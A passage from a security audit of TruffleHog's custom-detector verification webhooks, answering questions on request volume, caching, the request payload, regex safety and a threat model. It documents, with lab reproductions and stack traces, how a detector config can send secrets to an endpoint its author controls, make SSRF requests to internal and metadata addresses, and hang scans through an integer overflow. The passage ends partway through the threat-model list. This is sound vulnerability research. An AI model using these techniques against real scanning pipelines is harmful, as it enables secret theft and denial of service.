  a=11 b=10 run=1 requests=100   run=2 requests=100   (product=110, sum=21 → capped 100)
```

Mechanism: `permutateMatches` builds `lengths=[a,b]` and calls `productIndices(a,b)` whose `count = a*b` [`custom_detectors.go:288-290`, invoked at `:329`], then clamps to 100. 3×4→12 (≠ sum 7) proves the unit is the **Cartesian product of matches**, and 11×10→100 proves the clamp applies to that product.

### Condition 3 — the 100 cap is PER SPAN, so a single file exceeds 100 [OBSERVED — refutes any "hard-capped at 100" reading]

`detectChunk` calls `FromData` **once per span** — `matches := data.detector.Matches(); for _, matchBytes := range matches { … FromData(…, matchBytes) }` [`pkg/engine/engine.go:1061-1070`]. Spans are the merged keyword regions computed by the default `adjustableSpanCalculator` (radius 512, end = keywordIdx+`MaxSecretSize`=1000) [`pkg/engine/ahocorasick/ahocorasickcore.go:80-113,160`]. Two dense token clusters separated by a >1.5 KB keyword-free gap therefore form **two** spans in **one** chunk, each independently clamped to 100.

Command (NO `--scan-entire-chunk`, default spans): `/tmp/lab/th filesystem --no-update --no-verification-cache --config=msc.yaml msC.txt` — `msC.txt` = 100 distinct tokens, 4000×`x` gap, 100 distinct tokens (6801 bytes < ChunkSize 10240 → single chunk):

```
  file bytes: 6801  (<10240 => single chunk)
  run=1 total_requests=200
  run=2 total_requests=200
  run=3 total_requests=200
```

Across MULTIPLE chunks (4 clusters × 100 tokens separated by 4000-byte gaps, 22404 bytes > ChunkSize 10240):

```
  file bytes: 22404  (>10240 => multiple chunks)
  run=1 total_requests=500
  run=2 total_requests=500
```

**Whole-chunk span reaches `TotalChunkSize` 13312, not `ChunkSize` 10240 [OBSERVED — corrects an earlier "10240" bound].** The reason the multi-chunk total exceeds a naive `4 clusters × 100 = 400` is that each chunk's scanned data buffer is **`TotalChunkSize = ChunkSize (10240) + PeekSize (3072) = 13312` bytes** [`pkg/sources/chunker.go:13-18`]: the reader fills `ChunkSize`, then `Peek`s the next `PeekSize` bytes and appends them, so a cluster near a chunk boundary is scanned by **both** the current chunk's peek region **and** the next chunk — double-counted. Proven directly by placing a single token at a controlled offset in a 14001-byte file (`--scan-entire-chunk`, cache off), 2 runs each:
```
  token at offset  5000: run1=1 run2=1
  token at offset 11000: run1=2 run2=2
```
Offset 5000 (< 10240) is scanned once; offset 11000 (in the `[10240, 13312)` peek window) is scanned **twice** — once by chunk #1's 3072-byte peek and once by chunk #2 — confirming the whole-chunk span bound is **13312**.

Cause→effect: 2 spans → 2×100 = **200**; the 4-cluster multi-chunk file → **500** (each chunk contributes its own per-span 100s, plus the peek-overlap double-counting of boundary clusters just proven — a real product behavior, not a harness artifact). Either way, **a file trivially drives >100 outbound requests**, so 100 is a per-span work-limit, never a global request ceiling.

### Condition 4 — multiple verifiers multiply requests further [OBSERVED]

`createResults` loops over every `verify:` entry, sending to each in order until one returns an **exact 200**, then `break` [`custom_detectors.go:222-223,240,249,268`]. With M verifiers that never return 200, each permutation issues M requests.

Command: config with 3 verifiers (`/v1,/v2,/v3`) all served **500**; target = 5 permutations:

```
  run=1 total=15  /v1=5 /v2=5 /v3=5
  run=2 total=15  /v1=5 /v2=5 /v3=5
```

Cause→effect: 5 permutations × 3 verifiers (none 200) = **15** requests. So the per-span figure is further multiplied by up to M.

### Condition 5 — concurrency and the (absence of) throttling [OBSERVED + source]

All permutation goroutines are launched on an `errgroup.Group` created with **no `SetLimit`** [`custom_detectors.go:112,155,161`], so up to 100 verification requests for one span run **concurrently**. Detector workers number `concurrency * 8` (`detectorWorkerMultiplier` default 8) [`pkg/engine/engine.go:343-345,676`] = **32** on this 4-CPU host. There is no `time.Sleep`, rate limiter, or token bucket anywhere in `FromData`/`createResults`.

Runtime confirmation that nothing paces the requests — 100 requests add ~0.16 s over a 1-request scan (both dominated by the ~1.9 s process/scan startup floor):

```
  N=1   requests=1   wall=1.900s
  N=100 requests=100 wall=2.056s
```

### Condition 6 — verification cache (DEFAULT ON): what suppresses requests [OBSERVED + source]

Verification caching is **on by default** (disable with `--no-verification-cache`) [`main.go:85,535-536`]. It is **all-or-nothing per span**: the wrapper first calls the detector with `verify=false`, looks up every result, and only if **every** result is already cached returns with **zero** HTTP requests; if **any** result misses, the **whole span** is re-verified [`pkg/verificationcache/verification_cache.go:69-133`].

Cross-span suppression — the SAME secret in two spans of one chunk (spans are processed sequentially in `detectChunk`'s loop, so span 1 stores before span 2 looks up):

```
  cache-ON  run=1 requests=1   run=2 requests=1     (span 2 fully cached → suppressed)
  cache-OFF run=1 requests=2   run=2 requests=2
```

Repeated-secret suppression **at scale** [OBSERVED]. Fixture `c6_scale.txt` = **60450 bytes**, the *same* secret `labtok_same01` repeated **30 times**, each separated by a 2000-byte keyword-free gap (→ 30 spans), against a single endpoint that returns `200`. Command (endpoint on `127.0.0.1:<port>`; the only variable is the cache flag):
```
/tmp/lab/th filesystem --no-update [--no-verification-cache] --config=c6b.yaml c6_scale.txt
  cache-OFF  5 runs: 35 35 35 35 35                       (deterministic)
  cache-ON  12 runs: 6 6 6 6 6 6 6 6 6 6 6 5              (observed range 5–6)
```
A **distinct-secret control** (30 *different* secrets, same layout) isolates that the collapse is secret-keyed, not span-keyed:
```
  distinct cache-OFF 3 runs: 35 35 35
  distinct cache-ON  3 runs: 30 30 30
```
Cause→effect: **cache-OFF = 35 deterministically** — 30 clusters plus ~5 chunk-boundary clusters that fall in the `TotalChunkSize` peek overlap and are re-scanned (the same double-counting proven in C3). With the **default cache on** and one *repeated* secret, those 35 would-be requests collapse to a small nondeterministic **5–6**: the ~32 concurrent detector workers each look up the shared entry, and a handful *race* — missing it before the first store completes — so 5–6 verify instead of the ideal 1. The **distinct-secret** control shows the mechanism is secret-keyed: cache-on still issues **30** (one unique verify per distinct secret) minus the boundary duplicates, i.e. exactly 30, never collapsing further. The 5–6 spread is a genuine concurrency race in the shared cache, **not** a measurement artifact (the OFF baseline is perfectly stable at 35, and the ON spread reproduces across runs); it is reported as an observed range per the reproduce-the-inconsistency rule rather than smoothed to a single number.

**Cache key excludes the detector name.** The key is `Hash(Raw ‖ RawV2 ‖ DetectorType)` [`verification_cache.go:136-146`], and `DetectorType` is the constant `CustomRegex` for **every** custom detector while `DetectorName` is **not** part of the key. Therefore two *different* custom detectors that match the *same secret value* share one cache entry, and a cached verified result is copied into the other via `CopyVerificationInfo` (`VerificationFromCache=true`) [`verification_cache.go:91-92`].

Runtime note on the collision [OBSERVED + INFERRED]: in a single concurrent scan, two custom detectors matching the same secret **race** — both miss the shared entry before either stores, so both verify (total=2 with and without cache):

```
  cache-ON  A_endpoint=1 B_endpoint=1 total=2
  cache-OFF A_endpoint=1 B_endpoint=1 total=2
```

The shared-key **collision is confirmed in source**; its harmful *poisoning direction* (detector B inheriting detector A's verified state without contacting B's own endpoint) is **order-dependent** and requires the cache to already hold A's result when B looks up. I did not observe deterministic poisoning in a single concurrent chunk (B, whose own endpoint returned 500, stayed unverified) — labeled **INFERRED** for the poisoning outcome, **OBSERVED** for the race and for the secret-keyed suppression.

### Condition 7 — the two distinct timeouts [source, corroborated by Condition below]

- Per-request HTTP client timeout = **5 s** (`SaneHttpClient`) [`pkg/common/http.go:209`].
- Per-span detection context timeout = **10 s** (`detectionTimeout = detectors.DefaultResponseTimeout`) [`pkg/engine/engine.go:37`; `pkg/detectors/http.go:18`], applied at `context.WithTimeout(ctx, detectionTimeout)` [`engine.go:1066`], overridable with `--detector-timeout` [`main.go:77,471`]. A watchdog logs "a detector ignored the context timeout" at detectionTimeout+1 s [`engine.go:1067`] (seen live in the config-DoS evidence below).

---

### Condition 8 — configuration-driven denial of service via permutation overflow [OBSERVED]

`productIndices` computes `count := 1; for _, l := range lengths { count *= l }` with **no overflow guard**, then `if count > maxTotalMatches { count = maxTotalMatches }`, then `make([][]int, count)` [`custom_detectors.go:288-299`]. A config with enough named regexes and in-span matches overflows the signed 64-bit `count` to a **negative** value; `count > 100` is then **false**, the cap is bypassed, and `make([][]int, negative)` **panics**.

Canonical run — detector with **10 named regexes**, target with **99 matches each** (`99^10 = 9.04e19`, int64-wrapped = **−1795512867667309079**), one chunk:

```
$ /tmp/lab/th filesystem --no-update --no-verification --scan-entire-chunk --config=ov.yaml ov.txt
VERDICT: still running after 25s -> HANG CONFIRMED (scan never completes)
```

Stderr from the panicking detector goroutine — **run 1 of 2**. The two runs are **structurally identical** (same frames, same `makeslice` error, same subsequent hang); only volatile values differ per run (goroutine ID, pointer/argument values, `detector_worker_id`, timestamps). The **only** transformation applied is abbreviating the absolute build path to `<checkout>/`; every other byte — including Go's own `...` struct-argument elision emitted by the runtime and the `+0x…` PC offsets — is verbatim:

```
2026-07-14T21:26:13Z	error	trufflehog	goroutine 462 [running]:
runtime/debug.Stack()
	/usr/local/go/src/runtime/debug/stack.go:26 +0x5e
github.com/trufflesecurity/trufflehog/v3/pkg/common.Recover({0x58f32c0, 0xc00225e900})
	<checkout>/pkg/common/recover.go:17 +0x5b
panic({0x4582100?, 0x586e6f0?})
	/usr/local/go/src/runtime/panic.go:792 +0x132
github.com/trufflesecurity/trufflehog/v3/pkg/custom_detectors.productIndices({0xc002dbc230, 0xa, 0xc0028e1250?})
	<checkout>/pkg/custom_detectors/custom_detectors.go:299 +0x6c
github.com/trufflesecurity/trufflehog/v3/pkg/custom_detectors.permutateMatches(0xc0028e16f8)
	<checkout>/pkg/custom_detectors/custom_detectors.go:329 +0x28f
github.com/trufflesecurity/trufflehog/v3/pkg/custom_detectors.(*CustomRegexWebhook).FromData(0xc0016041c8, {0x7b52daa8ab98, 0xc003232c60}, 0x0, {0xc001e24a00?, 0x2540be400?, 0x7?})
	<checkout>/pkg/custom_detectors/custom_detectors.go:110 +0x533
github.com/trufflesecurity/trufflehog/v3/pkg/verificationcache.(*VerificationCache).FromData(0xc001d2af80, {0x58f32c0, 0xc003232c60}, {0x58db570, 0xc0016041c8}, 0x0, 0x21?, {0xc001e24a00, 0x1360, 0x3400})
	<checkout>/pkg/verificationcache/verification_cache.go:70 +0x696
github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).detectChunk(0xc001e18680, {0x58f32c0, 0xc00225e900}, {0xc003212540, {{0xc001e24a00, 0x1360, 0x3400}, {0x4eecb7a, 0x17}, 0x1, ...}, ...})
	<checkout>/pkg/engine/engine.go:1070 +0x345
github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).detectorWorker(0xc001e18680, {0x58f32c0, 0xc00225e900})
	<checkout>/pkg/engine/engine.go:1039 +0x150
github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).startDetectorWorkers.func1()
	<checkout>/pkg/engine/engine.go:685 +0xdc
created by github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).startDetectorWorkers in goroutine 1
	<checkout>/pkg/engine/engine.go:681 +0x10f
	{"detector_worker_id": "5PP5S", "recover": "runtime error: makeslice: len out of range", "error": "panic"}
2026-07-14T21:26:13Z	info-0	trufflehog	sentry flush failed	{"detector_worker_id": "5PP5S"}
2026-07-14T21:26:24Z	error	trufflehog	a detector ignored the context timeout	{"detector_worker_id": "5PP5S", "detector": {"name":"OverflowDet","type":"CustomRegex"}, "timeout": 10}
```

**Run 2 of 2** — the same hang reproduced on a separate invocation; the distinguishing (volatile-only) lines below confirm it is an independent run with an identical failure signature (different goroutine, `detector_worker_id`, and timestamp; same frame, same `makeslice` error, same post-panic timeout log):
```
2026-07-15T06:56:02Z	error	trufflehog	goroutine 415 [running]:
github.com/trufflesecurity/trufflehog/v3/pkg/custom_detectors.productIndices({0xc00007cfa0, 0xa, 0xc0025d9250?})
	{"detector_worker_id": "QhfWu", "recover": "runtime error: makeslice: len out of range", "error": "panic"}
2026-07-15T06:56:13Z	error	trufflehog	a detector ignored the context timeout	{"detector_worker_id": "QhfWu", "detector": {"name":"OverflowDet","type":"CustomRegex"}, "timeout": 10}
```
(As with run 1, the run hung and was terminated by killing the exact PID; the scan never completed on either run.)

In the `productIndices({…, 0xa, …})` frame the second argument `0xa` = **10** is `len(lengths)` — the ten named regexes whose per-regex match counts were multiplied; their product overflowed a signed `int` to a negative value, bypassing the `count > maxTotalMatches` clamp and reaching `make([][]int, count)` with a negative length [`pkg/custom_detectors/custom_detectors.go:299`].

Cause→effect: the `make` panic (`makeslice: len out of range`) is caught by `defer common.Recover(ctx)` at the top of `detectChunk` [`engine.go:1049`], so the worker survives — **but** the final, **non-deferred** `data.wgDoneFn()` [`engine.go:1123`] is skipped when the panic unwinds the stack, so the detection `WaitGroup` is never decremented for that chunk and the scan's `Wait()` **blocks forever**. Control run (10 regexes × **50** matches, `50^10` stays positive → capped to 100) completed normally in **2.01 s**, isolating the overflow as the sole cause. A configuration author can thus wedge a scan indefinitely with a purely declarative YAML — no network required.

**Coverage:** verify-once? **No — per permutation** (C1). Something more complex? **Yes — Cartesian product** (C2). Any limit? **Per-span `min(product,100)`, not global** (C1–C3), further **×M verifiers** (C4), dispatched **concurrently, unthrottled** (C5), modulated by a **default-on secret-keyed cache** (C6) and **5 s/10 s** timeouts (C7); plus a **config-DoS overflow hang** (C8).

---

## Q4 — Data sent to the webhook

**User question:** *"When the verification webhook is called, what data gets sent to the endpoint? What information is included in the request?"*

### Direct answer — **[OBSERVED]**
On the **first** verifier, TruffleHog sends an HTTP **`POST`** to the exact configured endpoint path with a **JSON body** `{"<DetectorName>":{"<regexName>":["<submatch>",…]}}` containing **the matched secret** (and, when the regex has a capture group, both the full match and the group). It also sends **each configured header** — but **not verbatim**: the header line is split on the **first** colon, the value is **left-trimmed** of whitespace, and the key is **canonicalized** by Go's `net/http`. A **`User-Agent`** header is added (`TruffleHog` by default, `TruffleHog <suffix>` with `--user-agent-suffix`, or **fully replaced** by a config-supplied `User-Agent` header), plus Go's automatic `Host`, `Content-Length`, and `Accept-Encoding: gzip`. **No `Content-Type` is set** even though the body is JSON. If a detector lists **multiple verifiers**, they are tried **sequentially until one returns exactly HTTP 200**, so a single match can emit **more than one** request. `SuccessRanges` is parsed but **never used** (only `== 200` verifies).

### Mechanism (cause → effect) — **[INFERRED from source, corroborated by the captures below]**
- Body: `json.Marshal(map[string]map[string][]string{ c.GetName(): match })` — `pkg/custom_detectors/custom_detectors.go:L214-L216`. `match` maps each regex name to its `FindAllStringSubmatch` slice, so the secret text (and any capture groups) are included.
- Method/URL: `http.NewRequestWithContext(ctx, "POST", verifyConfig.GetEndpoint(), …)` — `custom_detectors.go:L228`.
- Headers: `key, value, found := strings.Cut(header, ":")` (splits on the **first** colon) then `req.Header.Add(key, strings.TrimLeft(value, "\t\n\v\f\r "))` — `custom_detectors.go:L232-L238`. `Header.Add` canonicalizes the key (`textproto.CanonicalMIMEHeaderKey`) and **appends** duplicates. No `Content-Type` is ever set.
- User-Agent: injected by `CustomTransport.RoundTrip` (`req.Header.Add("User-Agent", UserAgent())`) — `pkg/common/http.go:L99-L102`; `UserAgent()` returns `"TruffleHog"` or `"TruffleHog " + suffix` — `L92-L97`. Because `createResults` adds config headers **before** the transport runs and Go's `Request.write` emits only the **first** `User-Agent` value, a config-supplied `User-Agent` header takes precedence.
- Multiple verifiers: `for _, verifyConfig := range c.GetVerify() { … if resp.StatusCode == http.StatusOK { … break } }` — `custom_detectors.go:L223-L270`. Network error or non-200 falls through to the next verifier (`continue` at `L242`); only exact `200` sets `Verified=true` and `break`s.
- `SuccessRanges`: the field exists (`custom_detectorspb…:L190`, `GetSuccessRanges` `:L246`) and a validator `ValidateVerifyRanges` exists (`validation.go:L55-L97`), but `NewWebhookCustomRegex` never calls it and `createResults` checks only `== http.StatusOK`, so it is a **no-op**.

### Observed output

**Q4.a — basic POST capture (2 runs, byte-identical).** Config header `Authorization: Bearer SUPER-SECRET-ADMIN-HEADER`; target contains `labtok_eee555`.
```
$ /tmp/lab/th filesystem --no-update --config=repro_q4.yaml repro_q4.txt      # run 1 and run 2 identical
✅ Found verified result 🐷🔑
Response: OK
# request captured at the mock (127.0.0.1:18170), one JSON log line, unedited:
{"seq": 1, "method": "POST", "path": "/verify", "ua": "TruffleHog", "auth": "Bearer SUPER-SECRET-ADMIN-HEADER", "content_type": null, "ua_all": ["TruffleHog"], "headers": [["Host", "127.0.0.1:18170"], ["User-Agent", "TruffleHog"], ["Content-Length", "51"], ["Authorization", "Bearer SUPER-SECRET-ADMIN-HEADER"], ["Accept-Encoding", "gzip"]], "body": "{\"LabTokenDetector\":{\"theToken\":[\"labtok_eee555\"]}}"}
```
`content_type` is **null** — no `Content-Type` is sent for the JSON body. The secret is in the body; the attacker-supplied `Authorization` is forwarded.

**Q4.b — capture-group regex** `theToken: 'labtok_([a-z0-9]{6})'` (submatch array carries **both** full match and group; `Raw result` is the group):
```
✅ Found verified result 🐷🔑
Raw result: eee555
# body captured at mock:
"body": "{\"CaptureDetector\":{\"theToken\":[\"labtok_eee555\",\"eee555\"]}}"
```

**Q4.c — headers are NOT verbatim** (config sends `X-Multi-Colon: a:b:c`, `x-lower-key:      spaced-value-with-leading-ws`, and `X-Dup` twice):
```
# headers as received at the mock:
X-Dup: one
X-Dup: two
X-Lower-Key: spaced-value-with-leading-ws
X-Multi-Colon: a:b:c
```
First-colon split keeps `a:b:c` intact as the value; the key `x-lower-key` is canonicalized to `X-Lower-Key`; the leading whitespace is trimmed; duplicate `X-Dup` keys are both appended.

**Q4.d — User-Agent is not fixed.** Default vs `--user-agent-suffix` vs a config-supplied `User-Agent`:
```
default:                       ua_all: ['TruffleHog']
--user-agent-suffix=Recon/9:   ua_all: ['TruffleHog Recon/9']
config header User-Agent:EvilAgent/1.0:  ua_all: ['EvilAgent/1.0']   # config value wins
```

**Q4.e — multiple verifiers tried sequentially until exact 200** (two verifiers; each mock counts its own hits):
```
# verifier#1 returns 500, verifier#2 returns 200:
✅ Found verified result 🐷🔑 ; Response: OK
first(500) mock requests = 1 ; second(200) mock requests = 1     # => 2 requests for ONE match
# both verifiers return 500:
Found unverified result 🐷🔑❓
first mock requests = 1 ; second mock requests = 1               # both tried, still 2 requests
```

**Q4.f — `SuccessRanges` is a no-op** (config `successRanges: ["200-299"]`, endpoint returns 204):
```
# endpoint returns 204 (inside the configured 200-299 range):
Found unverified result 🐷🔑❓        # NOT verified — only ==200 verifies
# control: same config, endpoint returns 200:
✅ Found verified result 🐷🔑
```

**Q4.g — response-body handling and verification-outcome edge cases** (each case run twice; run 1 and run 2 were byte-identical). Results are parsed from `--json`: `Verified` is `.Verified`, `response-key` is whether `ExtraData` contains a `"response"` entry, and `len` is that entry's byte length. The mock returns HTTP 200 with a controlled body size (`RESP_BODYLEN`), or the response is degraded (a partial write that closes early, no listener at all, or a reply slower than the client timeout):
```
case                                          Verified  response-key  len
empty 200 body      (RESP_BODYLEN=0)          True      present       0
small 200 body      (50 bytes)                True      present       50
oversized 200 body  (5000 'X' bytes)          True      present       200      # truncated to [:200]
partial 200 body    (CL:5000, 100B, close)    True      ABSENT        —        # verified but NOT stored
connection refused  (no listener :18179)      False     ABSENT        —
slow reply          (6s > 5s client timeout)  False     ABSENT        —        # wall 6.91s / 6.83s
```
Cause → effect, and why the **partial-body** row is the subtle one:
- The **empty / small / oversized** rows all verify because the only gate is `resp.StatusCode == http.StatusOK` (`custom_detectors.go:L249`). The stored `response` is the raw body passed through `if len(responseStr) > 200 { responseStr = responseStr[:200] }` (`L261-L262`), so 0→0, 50→50, and 5000→**exactly 200 bytes** — a **byte** cap, the same mechanism observed in Q1.b.
- The **partial-body** row is a runtime confirmation of the note below (not an inference): `result.Verified = true` is set at **`L251`**, *before* `io.ReadAll` runs at **`L253`**. The truncated write (declares `Content-Length: 5000`, writes 100 bytes, then closes) makes `ReadAll` fail with an unexpected-EOF error, so the handler takes `continue` at **`L254-L256`**, which skips `result.ExtraData["response"] = responseStr` at **`L266`**. **Observed:** `Verified=true` with **no** `response` key — the finding is reported as verified while the readback silently drops.
- **Connection-refused** and **slow-reply-past-timeout** never reach the 200 branch: `httpClient.Do` returns an error, so `if err != nil { continue }` at **`L240-L242`** falls through and the result stays unverified. The ~5 s ceiling is `DefaultResponseTimeout` on `SaneHttpClient` (`pkg/common/http.go`), so the 6 s reply is abandoned (~6.9 s wall = connect + timeout + teardown), matching the Q2 timeout behavior.

> **[OBSERVED + INFERRED]** `Host` and `Content-Length` appear on every captured request (Q4.a); that the **Go transport** (not the config) is their origin is **[INFERRED]**. The **body-read-error-after-200** behavior — `Verified=true` set at `custom_detectors.go:L251` *before* `io.ReadAll` at `L253`, with `continue` at `L254-L256` skipping the `response` store at `L266` — is now **[OBSERVED]** at runtime: see the **partial-body** row of Q4.g (`Verified=true`, no `response` key). A config-supplied `User-Agent` overriding the injected one is **[OBSERVED]** in Q4.d (Go emits only the first `User-Agent` value).

### Reproduction
1. Start the plaintext mock (Appendix) on a loopback port; write a detector config whose `verify` block has the endpoint plus the headers under test.
2. Put the keyword + a matching token in a target file.
3. `trufflehog filesystem --no-update --config=<cfg> <target>`; inspect the mock's single JSON log line for method/path/headers/body. For multiple verifiers, start one mock per endpoint and compare hit counts.
4. For the Q4.g edge cases, drive the response shape via the mock's env knobs (Appendix `mock_http.py`): `RESP_STATUS=200 RESP_BODYLEN=0|50|5000` for empty/small/oversized bodies; the early-closing `mock_partial.py` for the partial body; a port with **no** listener for connection-refused; and `RESP_DELAY=6` for the slow reply. Read the outcome from `--json` (`.Verified` and whether `ExtraData` has a `response` key) rather than the console line.

---

## Q5 — ReDoS / regex safety

**User question:** *"How does TruffleHog handle a complex/custom regex pattern? Are there safeguards around regex execution?"*

**Direct answer — [OBSERVED]** (the linear-time behavior is measured at runtime in Condition A and the backreference rejection in Condition B; RE2's *structural* guarantee that **no** pattern shape can backtrack is **[INFERRED]** from the RE2/Go design and **[CORROBORATED]** by those two observations plus the Python-`re` control in Condition A). Custom detector patterns are compiled and executed with **Go's standard-library `regexp` package** [`import "regexp"`, `pkg/custom_detectors/custom_detectors.go:9`], whose engine uses **RE2 *syntax* and RE2's linear-time matching guarantee — no backtracking and no backreferences**. (It is Go's own pure-Go implementation of those principles, **not** a separately linked C++ RE2 library.) Because matching is a finite-automaton walk with time **linear in the input length**, there is **no pattern shape that can trigger catastrophic backtracking**, so the classic ReDoS class does not apply to this path. This is confirmed two ways below. The safety derives from the **engine**, not from the detection timeout or `MaxSecretSize` (those bound the *input*, and the context does not interrupt a running synchronous match — see the note).

### Condition A — an "evil" pattern stays flat as input grows [OBSERVED]

Pattern `(a+)+$` (the textbook catastrophic-backtracking pattern) run against a target of N `a`s followed by a non-matching `X` (which defeats `$` and maximizes backtracking pressure). `--scan-entire-chunk` forces the whole (<10 KB, single-chunk) file into one span so the regex provably processes all N `a`s. A **benign** pattern `zzzzzzzz` is run on the **identical** input to isolate the process/scan startup floor.

Target generation: `python3 -c "open('t_N.txt','w').write('a'*N + 'X\n')"`. Command: `/tmp/lab/th filesystem --no-update --no-verification --scan-entire-chunk --config=<evil|benign>.yaml t_N.txt`. Two runs each:

```
N(a's)   evil_wall(s)   benign_wall(s)   evil-benign
1000 r1  2.009          2.009            0.000
1000 r2  1.909          2.010           -0.101
2000 r1  1.909          2.009           -0.100
2000 r2  2.009          1.808            0.201
4000 r1  1.908          1.908            0.000
4000 r2  2.009          1.909            0.100
8000 r1  2.009          1.909            0.100
8000 r2  2.009          2.011           -0.002
```

Cause→effect: the evil-pattern wall time is **flat (~1.9–2.0 s) across an 8× input increase** and is **indistinguishable from the benign control** (`evil − benign ≈ 0`, within ±0.2 s scheduling noise). The ~1.9–2.0 s is fixed process/scan startup, so regex execution cost is negligible. A backtracking engine would exhaust minutes-to-eternity on `(a+)+$` at only a few dozen `a`s; TruffleHog processes **8000** `a`s in the same time as a trivial pattern — the signature of RE2 linear-time matching. **End-to-end vs isolated:** these are end-to-end scan times; the benign-control subtraction isolates the regex contribution to ≈ 0.

**External control — the pattern is genuinely catastrophic under a *backtracking* engine [OBSERVED — Python `re`, not TruffleHog].** To prove `(a+)+$` is a real ReDoS pattern (so the flatness above is the *engine's* doing, not a weak pattern), the identical regex was run under Python's backtracking `re` on `'a'*n + '!'` (two runs; representative values):
```
re.search('(a+)+$', 'a'*n+'!'):  n=20 -> 0.097s   n=24 -> 1.518s   n=28 -> >10s (aborted)   n=32 -> >10s (aborted)
```
Each +4 characters multiplies the time ~10× until it is aborted past 10 s — textbook exponential ReDoS blow-up. Yet TruffleHog runs the **same** pattern over **8000** `a`s (Condition A) — 250× the `n=32` that already exhausts Python past 10 s — in ~2 s, because Go's `regexp` is RE2 (finite-automaton, no backtracking). This is external corroboration only; Python `re` is **not** part of TruffleHog.

### Condition B — a backreference is rejected at config load [OBSERVED]

RE2 does not support backreferences; Go's `regexp.Compile` therefore rejects them, and `ValidateRegex` compiles every pattern at load time [`pkg/custom_detectors/validation.go:23-33`].

```
$ /tmp/lab/th filesystem --no-update --no-verification --config=backref.yaml bt.txt   # regex: '(a)\1'
exit_code=1
error  trufflehog  error parsing the provided configuration file  {"error": "regex 'backref': error parsing regexp: invalid escape sequence: `\\1`"}
```

Control: a valid pattern `(a)a` loads and scans normally (`exit_code=0`, no error). Cause→effect: the backreference `\1` is an *invalid escape* to RE2, so the config is rejected before any scanning — a direct, observable hallmark that the engine is RE2-class (no backreferences), reinforcing the linear-time guarantee.

### Where and how the regex runs (mechanism + citations)

- Each named pattern is compiled with `regexp.Compile` [`custom_detectors.go:92`] and executed with `FindAllStringSubmatch` [`custom_detectors.go:97`] against the **span** passed to `FromData` — **not** the whole file. The default span is bounded by `MaxSecretSize()=1000` (+ keyword radius 512) [`custom_detectors.go:180-182`; `pkg/engine/ahocorasick/ahocorasickcore.go:80-113`]; `--scan-entire-chunk` widens the span to the whole chunk — which is `TotalChunkSize = ChunkSize (10240) + PeekSize (3072) = 13312` bytes [`pkg/sources/chunker.go:13-18`], **not** `ChunkSize` alone (the same bound proven directly by the peek-offset test in Q3/C3).
- Patterns are validated (compiled) at load time [`validation.go:23-33`], so a malformed/unsupported pattern fails fast (Condition B).

**Correcting the "safeguards."** The detection **timeout is not a regex-execution safeguard**: the 10 s per-span context is checked only via `common.IsDone(ctx)` **before** dispatch/verification [`custom_detectors.go:185,224`], never mid-match, so it cannot interrupt a synchronous `FindAllStringSubmatch` in progress. This is corroborated by the watchdog message `"a detector ignored the context timeout"` observed in the Q3/C8 evidence — the context timeout only *logs*, it does not preempt the running goroutine [`pkg/engine/engine.go:1067`] [INFERRED for a slow-regex case (RE2 cannot be made slow) + CORROBORATED by the observed watchdog]. Likewise `MaxSecretSize` bounds the **input length**, it is not a backtracking guard. The actual protection is the **RE2 linear-time engine**.

**Scope.** "ReDoS" here means **catastrophic regex backtracking**, which RE2 structurally eliminates (Conditions A, B). This is distinct from the *permutation-count* config-DoS documented under Q3/C8 (which is a `productIndices` integer-overflow hang, unrelated to regex matching time).

**Coverage:** How are custom regexes handled? **Compiled+executed by Go stdlib `regexp` (RE2, linear-time)** on the span. Safeguards around execution? **The engine itself (no backtracking, no backreferences)** — validated at load (B), demonstrated linear at runtime (A); the timeout/`MaxSecretSize` bound input but do not guard matching.

---

## Q6 — Overall threat model

**User question:** *"Could someone with control over a detector configuration abuse the verification system in unanticipated ways?"*

### Verdict — synthesis of Q1–Q5 **[OBSERVED except where a clause is tagged INFERRED]**
**Yes — substantially, and in several dimensions without any bound.** The relevant threat actor is a party who authors or controls a custom-detector YAML passed to `--config`. This is a realistic trust boundary: in the motivating scenario, teams contribute detector configurations, and that YAML is untrusted input parsed by `protoyaml.UnmarshalStrict` [`pkg/config/config.go:L27-L36`] into a verifier that then executes on the scanning host. The verification subsystem treats every field of that config — endpoint, headers, regexes, and the verifier list — as fully trusted, with no destination, volume, or overflow guard.

**What the config author CAN do (all OBSERVED):**

1. **Exfiltrate secrets and arbitrary headers (Q4).** Every matched secret value is `POST`ed as a JSON body to the configuration-controlled endpoint, together with any attacker-chosen static headers (normalized, not verbatim). There is no `Content-Type`. This is a direct data-exfiltration channel to an attacker endpoint the moment any secret matches.
2. **Use TruffleHog as an SSRF proxy with readback (Q1).** There is no destination validation, so loopback (IPv4 and IPv6 `[::1]`), RFC1918 private, link-local, and the exact `169.254.169.254` endpoint are all dispatched to; a mixed-case scheme (`HTTP://`) even bypasses the `unsafe` gate. On an **exact HTTP 200** the first **200 bytes** of the response are echoed into `ExtraData["response"]`, i.e. a **semi-in-band SSRF read** primitive. *Prerequisites for the readback:* the internal endpoint must return exactly `200`, the result must actually be emitted (a cache miss — see Q3/C6), and the response body must read cleanly — a **partial/truncated** body still marks the finding verified but stores **no** `response` readback (Q4.g). *Bound:* because the request is a fixed `POST`, it will **not** lift credentials from a modern **IMDSv2** endpoint (which requires a `PUT`-token then a `GET`); against IMDSv1 or any internal service that answers `200`, the read works. **[bound clause: INFERRED from AWS IMDS docs + OBSERVED POST-only dispatch]**
3. **Trigger high-volume, unthrottled outbound bursts (Q3).** Up to **100 concurrent requests per span** (no `errgroup` limit, no throttle), and because the 100 cap is **per span** and a file has many spans across chunks, a single file drove **200** and **500** requests in the lab; multiple verifiers multiply this further (**×M**). This is an internal port-scan / request-amplification primitive against a chosen destination.
4. **Wedge the scan indefinitely with a declarative config (Q3/C6→C8).** A config with enough named regexes and in-span matches overflows the signed-64-bit permutation count in `productIndices`, bypassing the cap and panicking in `make`; the panic is recovered but the non-deferred `wgDoneFn()` is skipped, so the detection `WaitGroup` never completes and the scan **hangs forever**. No network is required — a pure config-DoS of the scanning pipeline itself.

**What the config author CANNOT (easily) do (OBSERVED):**

